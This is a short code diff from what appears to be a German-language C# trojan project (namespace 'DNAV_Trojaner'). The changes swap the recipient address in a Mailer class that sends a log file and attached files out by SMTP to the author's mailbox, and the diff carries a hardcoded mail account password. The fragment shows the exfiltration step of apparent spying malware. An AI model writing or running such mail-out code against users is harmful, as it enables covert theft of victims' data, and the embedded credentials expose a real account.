@@ -10,7 +10,7 @@ namespace DNAV_Trojaner {
         //! Beispieleinbindungen 
         //? Am besten trz eigene Console samt guten Name.  
             //! ini   
-            Mailer m = new Mailer("dnav@gmx.com"); //? Selber Email senden
+            Mailer m = new Mailer("dnav@gmx.de"); //? Selber Email senden
             string log = @"log.txt";
             File.Delete(log);
             System.Threading.Thread.Sleep(100);
@@ -43,7 +43,7 @@ namespace DNAV_Trojaner {
     //! Beispieleinbindungen
         public void sendMail(){
             Mailer A = new Mailer("tempTo@mail.de");
-            Mailer B = new Mailer("tempTo@mail.de","dnav@gmx.com","DNAV@gmx.de","MiauMiau",465,"mail.gmx.com");
+            Mailer B = new Mailer("tempTo@mail.de","dnav@gmx.de","DNAV@gmx.de","MiauMiau",465,"mail.gmx.com");
             A.send("Betreff/Neue Datei", "Inhalt/Eine neue Datei verfügbat:", @"path");
             B.send("Betreff","Inhalt");
         }
